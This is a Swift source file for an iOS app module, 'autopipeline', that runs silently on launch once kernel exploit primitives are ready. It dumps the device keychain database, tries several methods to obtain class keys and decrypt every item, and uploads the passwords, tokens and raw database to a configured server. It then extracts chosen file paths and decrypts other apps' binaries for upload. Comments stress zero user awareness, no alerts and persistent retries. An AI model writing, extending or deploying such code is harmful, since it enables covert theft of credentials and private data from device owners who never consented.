//
//  autopipeline.swift
//  lara
//
//  Silent end-to-end pipeline: on app launch, once the kernel primitives
//  and VFS are ready, automatically extract the keychain, attempt decode,
//  and upload the result to the configured server. No UI prompts, no
//  alerts; failures retry automatically and a pending payload persists
//  across launches so nothing is lost.
//
//  "用户无感" contract:
//    - zero user interaction (auto-start on launch, auto-resume on active)
//    - never shows alerts / blocks UI
//    - uploads retry with backoff; pending payload survives relaunch
//    - dedup by content hash so the server does not receive duplicates
//
//  Config (UserDefaults, Info.plist fallbacks):
//    lara.auto.enabled        (Bool, default true)
//    lara.auto.alwaysUpload   (Bool, default true — re-upload every launch)
//    lara.auto.dedup          (Bool, default true)
//    lara.auto.includeRawDB   (Bool, default true — base64 of keychain-2.db)
//    lara.upload.serverURL / apiToken / deviceID  (shared with uploadmgr)
//

import Foundation
import Combine
import UIKit
import CommonCrypto

final class autopipeline {
    static let shared = autopipeline()

    enum Stage: Equatable {
        case idle
        case waitingPrimitives
        case extracting
        case uploading
        case done(String)          // payload hash uploaded
        case deferred(String)      // saved locally, will retry
        case failed(String)
    }

    @Published private(set) var stage: Stage = .idle

    private struct Config {
        var enabled: Bool
        var alwaysUpload: Bool
        var dedup: Bool
        var includeRawDB: Bool
        var maxRetries: Int
        var serverURL: URL?
        var apiToken: String
        var deviceID: String
        var extractPaths: [String]      // paths to auto-extract (zip+upload)
        var decryptBundleIDs: [String]  // apps to auto-decrypt (砸壳) + upload

        static func load() -> Config {
            let d = UserDefaults.standard
            let info = Bundle.main.infoDictionary
            func b(_ key: String, _ fallback: Bool) -> Bool {
                if d.object(forKey: key) != nil { return d.bool(forKey: key) }
                return (info?[key] as? Bool) ?? fallback
            }
            func s(_ key: String) -> String {
                d.string(forKey: key) ?? (info?[key] as? String) ?? ""
            }
            func arr(_ key: String) -> [String] {
                if let a = d.stringArray(forKey: key) { return a }
                return (info?[key] as? [String]) ?? []
            }
            let url = d.url(forKey: "lara.upload.serverURL")
                ?? (info?["lara.upload.serverURL"] as? String).flatMap(URL.init(string:))
            return Config(
                enabled: b("lara.auto.enabled", true),
                alwaysUpload: b("lara.auto.alwaysUpload", true),
                dedup: b("lara.auto.dedup", true),
                includeRawDB: b("lara.auto.includeRawDB", true),
                maxRetries: 6,
                serverURL: url,
                apiToken: s("lara.upload.apiToken"),
                deviceID: s("lara.upload.deviceID"),
                extractPaths: arr("lara.auto.extractPaths"),
                decryptBundleIDs: arr("lara.auto.decryptBundleIDs")
            )
        }
    }

    private let pendingKey = "lara.auto.pendingPayload"
    private let lastHashKey = "lara.auto.lastHash"
    private let attemptedKey = "lara.auto.attemptedThisLaunch"

    private var cancellables: Set<AnyCancellable> = []
    private var retryTimer: Timer?
    private var pipelineRunning = false
    private var pipelineQueued = false
    private var hasStarted = false

    private init() {}

    // MARK: - lifecycle

    /// Call once on app launch (after offsets/keepalive setup).
    func start() {
        guard !hasStarted else { return }
        hasStarted = true

        // Observe readiness: run as soon as kernel + VFS are up.
        laramgr.shared.$dsready
            .combineLatest(laramgr.shared.$vfsready)
            .receive(on: DispatchQueue.main)
            .sink { [weak self] ds, vfs in
                guard let self = self else { return }
                if ds && vfs && self.pipelineQueued {
                    self.pipelineQueued = false
                    self.runPipeline()
                }
            }
            .store(in: &cancellables)

        let cfg = Config.load()
        guard cfg.enabled else { stage = .idle; return }

        if !UserDefaults.standard.bool(forKey: attemptedKey) {
            // First run of this launch: try now (even if primitives not yet
            // ready — if they are not, the observer above will fire).
            UserDefaults.standard.set(true, forKey: attemptedKey)
            pipelineQueued = true
            if laramgr.shared.dsready && laramgr.shared.vfsready {
                pipelineQueued = false
                runPipeline()
            } else {
                stage = .waitingPrimitives
            }
        } else if hasPendingPayload() {
            // A previous launch left an un-uploaded payload.
            pipelineQueued = true
            if laramgr.shared.dsready && laramgr.shared.vfsready {
                pipelineQueued = false
                runPipeline()
            } else {
                stage = .waitingPrimitives
            }
        }
    }

    /// Call on scenePhase == .active to resume pending uploads.
    func resumeIfPending() {
        guard Config.load().enabled else { return }
        if hasPendingPayload() && !pipelineRunning && !pipelineQueued {
            pipelineQueued = true
            if laramgr.shared.dsready && laramgr.shared.vfsready {
                runPipeline()
            } else {
                stage = .waitingPrimitives
            }
        }
    }

    // MARK: - pipeline

    private func runPipeline() {
        guard !pipelineRunning else { return }
        pipelineRunning = true
        retryTimer?.invalidate()
        retryTimer = nil
        stage = .extracting

        DispatchQueue.global(qos: .utility).async { [weak self] in
            guard let self = self else { return }
            let cfg = Config.load()
            let result = self.performExtraction(cfg: cfg)
            let payload = self.buildPayload(from: result, cfg: cfg)
            guard let json = payload.jsonData, let hash = payload.contentHash else {
                self.fail("payload build failed")
                return
            }

            // dedup: skip re-upload when content unchanged and not forced
            if cfg.dedup && !cfg.alwaysUpload {
                let last = UserDefaults.standard.string(forKey: self.lastHashKey)
                if last == hash {
                    UserDefaults.standard.removeObject(forKey: self.pendingKey)
                    self.finish("unchanged since last upload (hash \(hash.prefix(12)))")
                    return
                }
            }

            self.savePending(json)
            self.uploadLoop(json: json, hash: hash, cfg: cfg, attempt: 0) { [weak self] in
                // keychain upload settled → run file-extract + decrypt stage
                // on a background queue so the UI stays responsive (用户无感).
                guard let self = self else { return }
                DispatchQueue.global(qos: .utility).async {
                    self.runFileStage(cfg: cfg)
                }
            }
        }
    }

    // MARK: - file extraction + app decrypt (砸壳) stage

    /// After the keychain upload completes (success or final failure), extract
    /// the configured paths and decrypt the configured apps, then upload.
    private func runFileStage(cfg: Config) {
        let fm = FileManager.default
        let docs = fm.urls(for: .documentDirectory, in: .userDomainMask).first!

        // 1. file extraction → zip → upload
        for path in cfg.extractPaths {
            guard let zip = extractmgr.shared.extractToZip(path: path) else {
                laramgr.shared.logmsg("[autopipeline] extract failed: \(path)")
                continue
            }
            uploadFileWithRetry(zip, endpoint: "files", cfg: cfg)
        }

        // 2. app decrypt (砸壳) → upload decrypted binary
        guard let appList = laramgr.shared.getAppList() else {
            laramgr.shared.logmsg("[autopipeline] app list unavailable; decrypt skipped")
            return
        }
        let bundleRoot = "/private/var/containers/Bundle/Application"
        let fm2 = FileManager.default
        for bundleID in cfg.decryptBundleIDs {
            guard let info = appList[bundleID] else {
                laramgr.shared.logmsg("[autopipeline] app not installed: \(bundleID)")
                continue
            }
            let dir = bundleRoot + "/" + info.bundleFolder
            guard let items = try? fm2.contentsOfDirectory(atPath: dir),
                  let appDir = items.first(where: { $0.hasSuffix(".app") }) else {
                laramgr.shared.logmsg("[autopipeline] app bundle not found: \(bundleID)")
                continue
            }
            let appPath = dir + "/" + appDir
            let outPath = docs.appendingPathComponent("decrypted_\(bundleID.replacingOccurrences(of: ".", with: "_")).bin").path
            let r = decrypt_app(appPath, info.executable, outPath)
            if r == 0, fm.fileExists(atPath: outPath) {
                laramgr.shared.logmsg("[autopipeline] decrypted \(bundleID)")
                uploadFileWithRetry(URL(fileURLWithPath: outPath), endpoint: "files", cfg: cfg)
            } else {
                laramgr.shared.logmsg("[autopipeline] decrypt failed: \(bundleID) rc=\(r)")
            }
        }
    }

    private func uploadFileWithRetry(_ url: URL, endpoint: String, cfg: Config) {
        let config = uploadmgr.UploadConfig(
            serverURL: cfg.serverURL,
            apiToken: cfg.apiToken,
            deviceID: cfg.deviceID,
            autoUpload: true,
            timeout: 300)
        guard config.serverURL != nil else {
            laramgr.shared.logmsg("[autopipeline] file upload skipped: no server configured")
            return
        }
        uploadmgr.shared.uploadFileWithRetry(url, endpoint: endpoint, config: config) { result in
            switch result {
            case .success:
                laramgr.shared.logmsg("[autopipeline] uploaded \(url.lastPathComponent)")
            case .failure(let e):
                laramgr.shared.logmsg("[autopipeline] upload failed \(url.lastPathComponent): \(e.localizedDescription)")
            }
        }
    }

    /// Extract + decode with all available key-fetch backends (silent).
    private func performExtraction(cfg: Config) -> keychainmgr.ExtractionResult {
        var result = keychainmgr.ExtractionResult()
        var msgs: [String] = []

        guard ds_is_ready(), laramgr.shared.vfsready else {
            msgs.append("primitives not ready")
            result.messages = msgs
            return result
        }

        guard let db = keychainmgr.shared.dumpKeychainDB() else {
            msgs.append("keychain-2.db dump failed")
            result.messages = msgs
            return result
        }
        result.rawDB = db
        msgs.append("keychain-2.db: \(db.count) bytes")

        let parsed = keychainmgr.shared.parseItems(from: db)
        result.items = parsed.items
        msgs.append(contentsOf: parsed.messages)

        // Try every key-fetch backend; stop at the first that yields keys.
        var keys: [UInt32: [Data]]? = nil
        for method in [KeybagFetchMethod.kernelKeybagScan,
                       KeybagFetchMethod.securitydScan,
                       KeybagFetchMethod.appleKeyStoreMIG] {
            if let k = keychainmgr.shared.fetchClassKeys(method: method, logger: { msgs.append($0) }),
               !k.isEmpty {
                keys = k
                msgs.append("class keys acquired via \(method)")
                break
            }
        }

        var decrypted = 0
        if let keys = keys {
            for i in result.items.indices {
                if keychainmgr.shared.decryptItem(&result.items[i], classKeys: keys) {
                    decrypted += 1
                }
            }
            msgs.append("decrypted \(decrypted)/\(result.items.count)")
        } else {
            msgs.append("class keys unavailable; items uploaded encrypted")
        }

        result.messages = msgs
        return result
    }

    // MARK: - payload

    private struct Payload {
        var jsonData: Data?
        var contentHash: String?
    }

    private func buildPayload(from result: keychainmgr.ExtractionResult, cfg: Config) -> Payload {
        var items: [[String: Any]] = []
        for item in result.items {
            var d: [String: Any] = [
                "table": item.table,
                "rowid": item.rowid,
                "agrp": item.agrp,
                "acct": item.acct,
                "svce": item.svce,
                "pdmn": item.pdmn,
            ]
            if let dec = item.decrypted {
                d["decrypted_b64"] = dec.base64EncodedString()
                if let s = String(data: dec, encoding: .utf8) {
                    d["decrypted"] = s
                }
                d["decrypted_flag"] = true
            } else if !item.data.isEmpty {
                d["encrypted_b64"] = item.data.base64EncodedString()
                d["decrypted_flag"] = false
            }
            items.append(d)
        }

        var root: [String: Any] = [
            "device": UIDevice.current.name,
            "deviceModel": UIDevice.current.model,
            "systemVersion": UIDevice.current.systemVersion,
            "xnuReady": ds_is_ready(),
            "exportedAt": ISO8601DateFormatter().string(from: Date()),
            "itemCount": items.count,
            "items": items,
            "messages": result.messages,
        ]
        var rawDB: Data? = nil
        if cfg.includeRawDB, let db = result.rawDB, db.count <= 8 * 1024 * 1024 {
            rawDB = db
            root["rawDB_b64"] = db.base64EncodedString()
            root["rawDBSHA256"] = sha256Hex(db)
        } else if let db = result.rawDB {
            root["rawDBSHA256"] = sha256Hex(db)
            root["rawDB_skipped_b64"] = true
        }

        guard let json = try? JSONSerialization.data(withJSONObject: root, options: [.sortedKeys]) else {
            return Payload(jsonData: nil, contentHash: nil)
        }

        // Content hash for dedup: items + rawDB only (no timestamps).
        var content = Data()
        if let itemsData = try? JSONSerialization.data(withJSONObject: items, options: [.sortedKeys]) {
            content.append(itemsData)
        }
        if let db = rawDB {
            content.append(db)
        }
        return Payload(jsonData: json, contentHash: sha256Hex(content))
    }

    // MARK: - upload

    private func uploadLoop(json: Data, hash: String, cfg: Config, attempt: Int,
                            completion: (() -> Void)? = nil) {
        stage = .uploading
        let config = uploadmgr.UploadConfig(
            serverURL: cfg.serverURL,
            apiToken: cfg.apiToken,
            deviceID: cfg.deviceID,
            autoUpload: true,
            timeout: 120)

        guard config.serverURL != nil else {
            // No server configured: keep the payload pending for later.
            fail("upload server not configured; payload kept local")
            completion?()
            return
        }

        uploadmgr.shared.uploadJSON(json, endpoint: "keychain", config: config) { [weak self] result in
            guard let self = self else { return }
            DispatchQueue.main.async {
                switch result {
                case .success:
                    UserDefaults.standard.set(hash, forKey: self.lastHashKey)
                    UserDefaults.standard.removeObject(forKey: self.pendingKey)
                    self.finish("uploaded (hash \(hash.prefix(12)))")
                    completion?()
                case .failure(let err):
                    if attempt + 1 < cfg.maxRetries {
                        let delay = TimeInterval(min(300, 10 * (attempt + 1)))
                        self.retryTimer = Timer.scheduledTimer(withTimeInterval: delay, repeats: false) { [weak self] _ in
                            guard let self = self else { return }
                            self.uploadLoop(json: json, hash: hash, cfg: cfg, attempt: attempt + 1,
                                            completion: completion)
                        }
                    } else {
                        // Give up this session, keep payload pending.
                        self.fail("upload failed after retries: \(err.localizedDescription); payload kept local")
                        completion?()
                    }
                }
            }
        }
    }

    // MARK: - persistence

    private func savePending(_ json: Data) {
        let url = pendingPayloadURL()
        try? FileManager.default.createDirectory(at: url.deletingLastPathComponent(),
                                                 withIntermediateDirectories: true)
        try? json.write(to: url)
        UserDefaults.standard.set(url.path, forKey: pendingKey)
    }

    private func hasPendingPayload() -> Bool {
        guard let path = UserDefaults.standard.string(forKey: pendingKey) else { return false }
        return FileManager.default.fileExists(atPath: path)
    }

    private func pendingPayloadURL() -> URL {
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
        return docs.appendingPathComponent("autopipeline/pending.json")
    }

    // MARK: - helpers

    private func sha256Hex(_ data: Data) -> String {
        var digest = [UInt8](repeating: 0, count: Int(CC_SHA256_DIGEST_LENGTH))
        data.withUnsafeBytes { buf in
            _ = CC_SHA256(buf.baseAddress, CC_LONG(data.count), &digest)
        }
        return digest.map { String(format: "%02x", $0) }.joined()
    }

    private func fail(_ msg: String) {
        DispatchQueue.main.async {
            self.retryTimer?.invalidate()
            self.retryTimer = nil
            self.stage = .deferred(msg)
            self.pipelineRunning = false
            laramgr.shared.logmsg("[autopipeline] \(msg)")
        }
    }

    private func finish(_ msg: String) {
        DispatchQueue.main.async {
            self.retryTimer?.invalidate()
            self.retryTimer = nil
            self.stage = .done(msg)
            self.pipelineRunning = false
            laramgr.shared.logmsg("[autopipeline] \(msg)")
        }
    }
}
